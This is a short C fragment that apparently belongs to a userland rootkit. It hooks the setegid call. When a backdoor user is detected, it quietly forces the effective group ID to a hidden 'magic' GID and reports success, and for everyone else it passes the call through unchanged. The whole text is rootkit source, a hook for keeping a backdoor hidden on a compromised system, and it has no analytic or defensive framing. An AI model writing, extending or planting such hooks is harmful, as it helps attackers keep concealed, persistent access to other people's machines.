int setegid(gid_t egid){
    hook(CSETEGID);
    if(is_bdusr()){
        gid_t magicgid = readgid();
        if(egid != magicgid)
            call(CSETEGID, magicgid);
        return 0;
    }
    return (long)call(CSETEGID, egid);
}
